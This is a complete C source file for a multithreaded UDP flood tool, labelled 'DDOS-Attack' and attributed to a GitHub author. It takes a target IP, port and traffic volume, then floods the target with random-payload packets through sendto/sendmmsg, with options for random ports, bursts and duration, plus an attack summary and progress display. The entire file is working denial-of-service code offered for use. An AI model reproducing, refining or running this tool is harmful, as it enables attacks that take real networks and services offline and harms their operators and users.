#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <fcntl.h>

// ======================== 配置结构 ========================
#define MAX_BURST_SIZE 256   // 防止栈溢出

typedef struct {
    char *target_ip;          // 目标IP
    int target_port;          // 目标端口
    long long total_packets;  // 总包数
    int packet_size;          // 包大小（字节）
    int num_threads;          // 线程数
    int burst_size;           // 突发包数
    double rate_limit;        // 速率限制（秒/突发）
    int duration;             // 持续时间（秒）
    int src_port_base;        // 源端口基数（-1表示随机）
    bool random_target_port;  // 随机目标端口
    bool no_prealloc;         // 禁用预分配
    char *log_file;           // 日志文件路径
    bool no_interactive;      // 跳过确认
    int max_retries;          // 最大重试次数
} Config;

Config g_config;  // 全局配置

// ======================== 共享统计（原子操作） ========================
static atomic_ullong total_sent = ATOMIC_VAR_INIT(0);     // 总发送包数
static atomic_ullong total_bytes = ATOMIC_VAR_INIT(0);    // 总发送字节数
static atomic_ullong total_dropped = ATOMIC_VAR_INIT(0);  // 总丢弃包数
static volatile bool stop_flag = false;                   // 停止标志

// ======================== 预分配地址数组 ========================
static struct sockaddr_in *port_addrs = NULL;

// ======================== 日志 ========================
static FILE *log_fp = NULL;

// 日志输出函数（同时输出到控制台和文件）
static void log_msg(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    if (log_fp) {
        va_start(args, fmt);
        vfprintf(log_fp, fmt, args);
        va_end(args);
        fflush(log_fp);
    }
}

// ======================== 信号处理器 ========================
static void sigint_handler(int sig) {
    (void)sig;
    stop_flag = true;
    log_msg("\n[!] 收到 SIGINT，正在停止...\n");
}

// ======================== 清屏 ========================
static void clear_screen(void) {
    system("clear");
}

// ======================== 横幅 ========================
static void show_banner(void) {
    // ================= 1. 警告页面 ==================
    clear_screen();
    printf("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809\n");
    printf("M       MMM M       MMM MMM     MMM MM       MM   BC-809\n");
    printf("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   BC-809\n");
    printf("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   BC-809\n");
    printf("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   BC-809\n");
    printf("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   BC-809\n");
    printf("M        MM M        MM MMM     MMM MM       MM   BC-809\n");
    printf("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809\n");
    printf("\n");
    
    printf("======================= 警告 ========================\n");
    printf("你正在跨越法律和道德的边界。请立即退出，或等待 3 秒后启动。\n");
    printf("====================================================\n");
    sleep(1);
    for (int i = 3; i > 0; i--) {
        printf("%d\n", i);
        sleep(1);
    }
    printf("启动中...\n");
    usleep(500000);
    
    // ====== 2. 清屏后显示 figlet 艺术字 ======
    clear_screen();
    // 尝试调用 figlet 生成艺术字
    int ret = system("figlet DDOS-Attack 2>/dev/null");
    if (ret != 0) {
        // 如果 figlet 不可用，使用 ASCII 降级方案
        printf(" ____  ____   ___  ____          _   _   _             _     \n");
        printf("|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ \n");
        printf("| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / \n");
        printf("| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  \n");
        printf("|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ \n");
    }
    printf("作者  : BCU-0\n");
    printf("GitHub: https://github.com/BC-809/DDOS-Attack.git\n\n");
}

// ======================== 内置参数解析 ========================
static void print_usage(const char *prog) {
    fprintf(stderr,
        "用法: %s -t <目标IP> -p <端口> -g <GB> [选项]\n"
        "  -t, --target        目标 IP 地址\n"
        "  -p, --port          目标 UDP 端口\n"
        "  -g, --gb            总流量（GB）\n"
        "  -P, --processes     线程数（默认 4）\n"
        "  -T  --threads       同 -P\n"
        "  -b, --burst         每突发包数（最大 %d，默认 50）\n"
        "  -r, --rate          速率限制（每突发秒数，默认 0）\n"
        "  -d, --duration      攻击持续时间（秒，0 表示直到发完）\n"
        "  -s, --src-port      源端口基数（每个线程偏移）\n"
        "      --size          包大小（字节，64-65507，默认 1490）\n"
        "      --random-port   每个包随机目标端口\n"
        "      --no-prealloc   禁用预分配（节省内存，性能略降）\n"
        "      --log           日志文件路径\n"
        "      --no-interactive跳过确认\n"
        "      --max-retries   最大重试次数（默认 3）\n"
        "  -h, --help          显示本帮助\n",
        prog, MAX_BURST_SIZE);
    exit(1);
}

static void parse_args(int argc, char **argv) {
    static struct option long_opts[] = {
        {"target", required_argument, 0, 't'},
        {"port", required_argument, 0, 'p'},
        {"gb", required_argument, 0, 'g'},
        {"processes", required_argument, 0, 'P'},
        {"threads", required_argument, 0, 'T'},
        {"burst", required_argument, 0, 'b'},
        {"rate", required_argument, 0, 'r'},
        {"duration", required_argument, 0, 'd'},
        {"src-port", required_argument, 0, 's'},
        {"size", required_argument, 0, 1},
        {"random-port", no_argument, 0, 2},
        {"no-prealloc", no_argument, 0, 3},
        {"log", required_argument, 0, 4},
        {"no-interactive", no_argument, 0, 5},
        {"max-retries", required_argument, 0, 6},
        {"help", no_argument, 0, 'h'},
        {0,0,0,0}
    };

    // 设置默认值
    g_config.target_ip = NULL;
    g_config.target_port = 0;
    g_config.total_packets = 0;
    g_config.packet_size = 1490;
    g_config.num_threads = 4;
    g_config.burst_size = 50;
    g_config.rate_limit = 0.0;
    g_config.duration = 0;
    g_config.src_port_base = -1;
    g_config.random_target_port = false;
    g_config.no_prealloc = false;
    g_config.log_file = NULL;
    g_config.no_interactive = false;
    g_config.max_retries = 3;

    double gb = 0.0;
    int opt, idx;
    while ((opt = getopt_long(argc, argv, "t:p:g:P:T:b:r:d:s:h", long_opts, &idx)) != -1) {
        switch (opt) {
            case 't': g_config.target_ip = strdup(optarg); break;
            case 'p': g_config.target_port = atoi(optarg); break;
            case 'g': gb = atof(optarg); break;
            case 'P': case 'T': g_config.num_threads = atoi(optarg); break;
            case 'b': g_config.burst_size = atoi(optarg); break;
            case 'r': g_config.rate_limit = atof(optarg); break;
            case 'd': g_config.duration = atoi(optarg); break;
            case 's': g_config.src_port_base = atoi(optarg); break;
            case 1: g_config.packet_size = atoi(optarg); break;
            case 2: g_config.random_target_port = true; break;
            case 3: g_config.no_prealloc = true; break;
            case 4: g_config.log_file = strdup(optarg); break;
            case 5: g_config.no_interactive = true; break;
            case 6: g_config.max_retries = atoi(optarg); break;
            case 'h': default: print_usage(argv[0]);
        }
    }

    // 检查必需参数
    if (!g_config.target_ip || g_config.target_port == 0 || gb <= 0.0) {
        fprintf(stderr, "缺少必需的参数（-t, -p, -g）。\n");
        print_usage(argv[0]);
    }

    // 限制突发大小
    if (g_config.burst_size > MAX_BURST_SIZE) {
        fprintf(stderr, "突发大小限制为 %d\n", MAX_BURST_SIZE);
        g_config.burst_size = MAX_BURST_SIZE;
    }
    if (g_config.burst_size < 1) g_config.burst_size = 1;

    // 校验包大小
    if (g_config.packet_size < 64) g_config.packet_size = 64;
    if (g_config.packet_size > 65507) g_config.packet_size = 65507;

    // 计算总包数
    g_config.total_packets = (long long)(gb * 1024.0 * 1024.0 * 1024.0 / g_config.packet_size);
    if (g_config.total_packets <= 0) {
        fprintf(stderr, "流量太小。\n");
        exit(1);
    }

    if (g_config.num_threads <= 0) g_config.num_threads = 1;
    if (g_config.max_retries < 0) g_config.max_retries = 0;
}

// ======================== 重发工具（带延迟，仅对 EAGAIN/EWOULDBLOCK 重试） ========================
static bool send_with_retry(int sockfd, const void *buf, size_t len,
                            const struct sockaddr *dest, socklen_t addrlen,
                            int max_retries) {
    int attempts = 0;
    while (attempts < max_retries) {
        ssize_t n = sendto(sockfd, buf, len, 0, dest, addrlen);
        if (n > 0) return true;  // 发送成功
        if (n < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                attempts++;
                usleep(1000);  // 1ms 微小延迟，减少 CPU 空转
                continue;
            } else {
                return false;  // 其他错误，放弃
            }
        }
        attempts++;
    }
    return false;
}

// ======================== sendmmsg 封装（Linux） ========================
static bool use_sendmmsg = false;

#ifdef __linux__
#include <sys/socket.h>
static int send_batch_mmsg(int sockfd, const void *buf, size_t len,
                           const struct sockaddr_in *dest, socklen_t addrlen,
                           int count) {
    struct mmsghdr msgs[count];
    struct iovec iov[count];
    // 所有消息复用同一个目标地址（无复制）
    for (int i = 0; i < count; i++) {
        iov[i].iov_base = (void*)buf;
        iov[i].iov_len = len;
        msgs[i].msg_hdr.msg_name = (void*)dest;      // 共享指针
        msgs[i].msg_hdr.msg_namelen = addrlen;
        msgs[i].msg_hdr.msg_iov = &iov[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
        msgs[i].msg_len = 0;
    }
    return sendmmsg(sockfd, msgs, count, 0);
}
#endif

// ======================== 线程函数 ========================
static void *sender_thread(void *arg) {
    long thread_id = (long)arg;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        log_msg("线程 %ld: socket 创建失败\n", thread_id);
        return NULL;
    }

    // 绑定源端口（若指定）
    if (g_config.src_port_base >= 0) {
        int src_port = g_config.src_port_base + (int)thread_id;
        struct sockaddr_in src_addr;
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(src_port);
        src_addr.sin_addr.s_addr = INADDR_ANY;
        if (bind(sockfd, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
            log_msg("线程 %ld: 绑定端口 %d 失败 (%s)，使用随机端口\n",
                    thread_id, src_port, strerror(errno));
        }
    }

    // 目标地址（初始值）
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(g_config.target_port);
    inet_pton(AF_INET, g_config.target_ip, &target_addr.sin_addr);

    // 分配载荷缓冲区
    unsigned char *payload = (unsigned char*)malloc(g_config.packet_size);
    if (!payload) {
        close(sockfd);
        log_msg("线程 %ld: malloc 失败\n", thread_id);
        return NULL;
    }
    // 用随机数据填充载荷（每个线程独立种子）
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)thread_id ^ (unsigned int)pthread_self();
    for (int i = 0; i < g_config.packet_size; i++) {
        payload[i] = rand_r(&seed) & 0xff;
    }

    // 计算本线程应发送的包数
    long long packets_to_send = g_config.total_packets / g_config.num_threads;
    if (thread_id < g_config.total_packets % g_config.num_threads) {
        packets_to_send++;
    }

    long long sent = 0;          // 本地发送计数
    long long bytes_sent = 0;    // 本地字节计数
    long long dropped = 0;       // 本地丢弃计数
    // 上次上报值（用于增量更新）
    long long last_sent = 0, last_bytes = 0, last_dropped = 0;

    while (!stop_flag && sent < packets_to_send) {
        int to_send = g_config.burst_size;
        if (sent + to_send > packets_to_send) {
            to_send = (int)(packets_to_send - sent);
        }

        if (g_config.random_target_port) {
            // 随机端口模式：逐个发送
            for (int i = 0; i < to_send; i++) {
                if (stop_flag || sent >= packets_to_send) break;
                int port = 1 + (rand_r(&seed) % 65535);
                if (g_config.no_prealloc || port_addrs == NULL) {
                    // 未预分配，每次重新设置端口
                    target_addr.sin_port = htons(port);
                    // sin_addr 保持不变，无需重设
                } else {
                    // 直接复制预分配的地址结构
                    target_addr = port_addrs[port];
                }
                bool ok = send_with_retry(sockfd, payload, g_config.packet_size,
                                          (struct sockaddr*)&target_addr,
                                          sizeof(target_addr), g_config.max_retries);
                if (ok) {
                    sent++;
                    bytes_sent += g_config.packet_size;
                } else {
                    dropped++;
                }
            }
        } else {
            // 固定端口：可使用 sendmmsg 或循环
#ifdef __linux__
            if (use_sendmmsg) {
                int remaining = to_send;
                while (remaining > 0 && !stop_flag && sent < packets_to_send) {
                    int sent_now = send_batch_mmsg(sockfd, payload, g_config.packet_size,
                                                   &target_addr, sizeof(target_addr), remaining);
                    if (sent_now > 0) {
                        sent += sent_now;
                        bytes_sent += (long long)sent_now * g_config.packet_size;
                        remaining -= sent_now;
                    } else {
                        // sendmmsg 完全失败，降级为逐个重试剩余包
                        for (int i = 0; i < remaining; i++) {
                            if (stop_flag || sent >= packets_to_send) break;
                            bool ok = send_with_retry(sockfd, payload, g_config.packet_size,
                                                      (struct sockaddr*)&target_addr,
                                                      sizeof(target_addr), g_config.max_retries);
                            if (ok) {
                                sent++;
                                bytes_sent += g_config.packet_size;
                            } else {
                                dropped++;
                            }
                        }
                        break; // 退出 while 循环
                    }
                }
            } else
#endif
            {
                // 普通 sendto 循环
                for (int i = 0; i < to_send; i++) {
                    if (stop_flag || sent >= packets_to_send) break;
                    bool ok = send_with_retry(sockfd, payload, g_config.packet_size,
                                              (struct sockaddr*)&target_addr,
                                              sizeof(target_addr), g_config.max_retries);
                    if (ok) {
                        sent++;
                        bytes_sent += g_config.packet_size;
                    } else {
                        dropped++;
                    }
                }
            }
        }

        // 增量更新全局统计（使用原子操作）
        long long delta_sent = sent - last_sent;
        long long delta_bytes = bytes_sent - last_bytes;
        long long delta_dropped = dropped - last_dropped;
        if (delta_sent > 0) atomic_fetch_add(&total_sent, delta_sent);
        if (delta_bytes > 0) atomic_fetch_add(&total_bytes, delta_bytes);
        if (delta_dropped > 0) atomic_fetch_add(&total_dropped, delta_dropped);
        last_sent = sent;
        last_bytes = bytes_sent;
        last_dropped = dropped;

        // 速率限制
        if (g_config.rate_limit > 0.0) {
            struct timespec ts = {
                .tv_sec = (time_t)g_config.rate_limit,
                .tv_nsec = (long)((g_config.rate_limit - (time_t)g_config.rate_limit) * 1e9)
            };
            nanosleep(&ts, NULL);
        }
        // 否则忙循环，让操作系统调度
    }

    // 最终更新（防止漏报）
    long long delta_sent = sent - last_sent;
    long long delta_bytes = bytes_sent - last_bytes;
    long long delta_dropped = dropped - last_dropped;
    if (delta_sent > 0) atomic_fetch_add(&total_sent, delta_sent);
    if (delta_bytes > 0) atomic_fetch_add(&total_bytes, delta_bytes);
    if (delta_dropped > 0) atomic_fetch_add(&total_dropped, delta_dropped);

    free(payload);
    close(sockfd);
    return NULL;
}

// ======================== 主函数 ========================
int main(int argc, char **argv) {
    // 解析命令行参数
    parse_args(argc, argv);

    // 打开日志文件（失败则继续运行）
    if (g_config.log_file) {
        log_fp = fopen(g_config.log_file, "a");
        if (!log_fp) {
            fprintf(stderr, "警告: 无法打开日志文件 '%s'，继续运行。\n", g_config.log_file);
        } else {
            time_t now = time(NULL);
            fprintf(log_fp, "\n--- 攻击会话开始于 %s", ctime(&now));
            fflush(log_fp);
        }
    }

    // 注册 SIGINT 处理器
    signal(SIGINT, sigint_handler);

    // 显示横幅（警告页面 + figlet 艺术字）
    show_banner();

    // 校验目标 IP
    struct sockaddr_in test_addr;
    if (inet_pton(AF_INET, g_config.target_ip, &test_addr.sin_addr) != 1) {
        log_msg("无效的目标 IP。\n");
        goto cleanup;
    }
    if (g_config.target_port < 1 || g_config.target_port > 65535) {
        log_msg("端口超出范围。\n");
        goto cleanup;
    }

    // 随机端口模式下预分配地址数组（除非禁用）
    if (g_config.random_target_port && !g_config.no_prealloc) {
        port_addrs = (struct sockaddr_in*)malloc(65536 * sizeof(struct sockaddr_in));
        if (!port_addrs) {
            log_msg("内存分配失败，将使用非预分配模式。\n");
            g_config.no_prealloc = true;
        } else {
            for (int i = 1; i <= 65535; i++) {
                port_addrs[i].sin_family = AF_INET;
                port_addrs[i].sin_port = htons(i);
                port_addrs[i].sin_addr = test_addr.sin_addr;
            }
            log_msg("[>] 随机端口预分配已启用 (65535 个地址)。\n");
        }
    }

    // 检测 sendmmsg 支持（Linux）
#ifdef __linux__
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock >= 0) {
        use_sendmmsg = true;
        close(sock);
    }
#endif

    // 输出攻击摘要
    log_msg("\n[>] 攻击摘要:\n");
    log_msg("    目标: %s:%d (UDP)\n", g_config.target_ip, g_config.target_port);
    log_msg("    总包数: %lld\n", g_config.total_packets);
    log_msg("    包大小: %d 字节\n", g_config.packet_size);
    log_msg("    线程数: %d\n", g_config.num_threads);
    if (g_config.src_port_base >= 0)
        log_msg("    源端口基数: %d (每个线程偏移)\n", g_config.src_port_base);
    if (g_config.rate_limit > 0.0)
        log_msg("    速率限制: %.3f 秒/突发\n", g_config.rate_limit);
    if (g_config.duration > 0)
        log_msg("    持续时间: %d 秒\n", g_config.duration);
    if (g_config.random_target_port) {
        log_msg("    随机目标端口: 开启");
        if (port_addrs && !g_config.no_prealloc)
            log_msg(" (使用预分配)\n");
        else
            log_msg(" (无预分配)\n");
    }
    log_msg("    突发大小: %d\n", g_config.burst_size);
    log_msg("    最大重试: %d\n", g_config.max_retries);
    if (use_sendmmsg)
        log_msg("    sendmmsg: 启用 (Linux 批量发送)\n");
    else
        log_msg("    sendmmsg: 禁用\n");

    // 交互确认
    if (!g_config.no_interactive) {
        printf("\n[!] 确认攻击 (yes/no): ");
        fflush(stdout);
        char buf[8];
        if (!fgets(buf, sizeof(buf), stdin) || strncmp(buf, "yes", 3) != 0) {
            log_msg("[>] 已取消。\n");
            if (log_fp) fclose(log_fp);
            exit(0);
        }
    }

    // 分配线程
    pthread_t *threads = (pthread_t*)malloc(g_config.num_threads * sizeof(pthread_t));
    if (!threads) {
        log_msg("线程分配失败\n");
        goto cleanup;
    }

    // 获取高精度计时器
    struct timespec start_ts;
    clock_gettime(CLOCK_MONOTONIC, &start_ts);

    // 启动线程
    int created = 0;
    for (int i = 0; i < g_config.num_threads; i++) {
        if (pthread_create(&threads[i], NULL, sender_thread, (void*)(long)i) != 0) {
            log_msg("创建线程 %d 失败\n", i);
            break;
        }
        created++;
    }

    // 如果创建的线程少于预期，立即停止
    if (created < g_config.num_threads) {
        stop_flag = true;
        log_msg("[!] 部分线程创建失败，攻击终止。等待已创建线程退出...\n");
        if (created > 0) {
            for (int i = 0; i < created; i++) {
                pthread_join(threads[i], NULL);
            }
        }
        free(threads);
        goto cleanup;
    }

    // 进度监控循环
    while (!stop_flag) {
        unsigned long long sent = atomic_load(&total_sent);
        if (sent >= g_config.total_packets) break;
        if (g_config.duration > 0) {
            struct timespec now_ts;
            clock_gettime(CLOCK_MONOTONIC, &now_ts);
            double elapsed = (now_ts.tv_sec - start_ts.tv_sec) +
                             (now_ts.tv_nsec - start_ts.tv_nsec) / 1e9;
            if (elapsed >= g_config.duration) {
                stop_flag = true;
                break;
            }
        }
        if (sent > 0) {
            struct timespec now_ts;
            clock_gettime(CLOCK_MONOTONIC, &now_ts);
            double elapsed = (now_ts.tv_sec - start_ts.tv_sec) +
                             (now_ts.tv_nsec - start_ts.tv_nsec) / 1e9;
            if (elapsed < 0.001) elapsed = 0.001;
            double progress = (double)sent / g_config.total_packets * 100.0;
            int bar_len = 30;
            int filled = (int)(bar_len * progress / 100.0);
            char bar[31];
            memset(bar, '█', filled);
            memset(bar+filled, '░', bar_len - filled);
            bar[bar_len] = '\0';
            double eta = (elapsed / sent) * (g_config.total_packets - sent);
            double rate = sent / elapsed;
            double data_gb = (double)atomic_load(&total_bytes) / (1024.0*1024*1024);
            unsigned long long dropped = atomic_load(&total_dropped);
            printf("\r[%s] %.1f%% | %llu/%lld 包 | %.3f GB | 速率: %.1f pps | 丢弃: %llu | 剩余时间: %.0fs",
                   bar, progress, sent, g_config.total_packets, data_gb, rate, dropped, eta);
            fflush(stdout);
        }
        usleep(500000); // 0.5 秒
    }

    // 设置停止标志
    stop_flag = true;

    // 等待所有线程结束
    for (int i = 0; i < g_config.num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    free(threads);

    // 最终统计
    struct timespec end_ts;
    clock_gettime(CLOCK_MONOTONIC, &end_ts);
    double elapsed = (end_ts.tv_sec - start_ts.tv_sec) +
                     (end_ts.tv_nsec - start_ts.tv_nsec) / 1e9;
    unsigned long long final_sent = atomic_load(&total_sent);
    unsigned long long final_bytes = atomic_load(&total_bytes);
    unsigned long long final_dropped = atomic_load(&total_dropped);
    log_msg("\n[>] 攻击结束。\n");
    log_msg("    发送包数: %llu\n", final_sent);
    log_msg("    丢弃包数: %llu\n", final_dropped);
    log_msg("    总数据量: %.4f GB\n", final_bytes / (1024.0*1024*1024));
    log_msg("    耗时: %.2f 秒\n", elapsed);
    if (elapsed > 0.0) {
        log_msg("    平均速率: %.1f pps\n", final_sent / elapsed);
    }

cleanup:
    // 释放资源
    if (port_addrs) free(port_addrs);
    if (g_config.target_ip) free(g_config.target_ip);
    if (g_config.log_file) free(g_config.log_file);
    if (log_fp) fclose(log_fp);
    return 0;
}
